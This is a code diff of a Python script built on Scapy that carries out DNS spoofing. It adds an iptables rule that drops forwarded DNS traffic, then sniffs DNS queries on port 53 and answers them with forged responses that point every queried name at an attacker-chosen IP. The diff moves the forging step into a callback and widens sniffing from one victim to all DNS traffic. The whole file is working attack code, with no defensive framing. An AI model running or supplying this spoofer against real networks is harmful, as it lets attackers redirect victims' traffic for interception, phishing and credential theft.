@@ -14,8 +14,12 @@ gotoIP = input()
 firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP" 
 Popen([firewall], shell=True, stdout=PIPE)
 
+def dnsspoof(recieved : IP):
+    if recieved.haslayer(DNS) and recieved.getlayer(DNS).qr==0:
+        spoof = (Ether()/ IP(dst=recieved[IP].src, src=recieved[IP].dst)/UDP(dport=recieved[UDP].sport, sport=recieved[UDP].dport)/DNS(id=recieved[DNS].id, qd=recieved[DNS].qd, qr=1,an=DNSRR(rrname=recieved[DNS].qd.qname, ttl=10, rdata=gotoIP) ))
+        sendp(spoof, verbose=1)
+
+
+
 while True:
-    a=sniff(promisc=1, count=1, filter="udp and port 53 and host " + victimIP)
-    if a[0].haslayer(DNS) and a[0].getlayer(DNS).qr==0:
-        spoof = (Ether())/IP(dst=a[0].getlayer(IP).src, src=a[0].getlayer(IP).dst)/UDP(dport=a[0].getlayer(UDP).sport, sport=a[0].getlayer(UDP).dport)/DNS(id=a[0].getlayer(DNS).id, qd=a[0].getlayer(DNS).qd, aa = 1, qr=1,an=DNSRR(rrname=a[0].getlayer(DNS).qd.qname, ttl=10, rdata=gotoIP))
-        sendp(spoof, count=1)
+    a = sniff(prn = dnsspoof,count=1, filter="udp port 53")
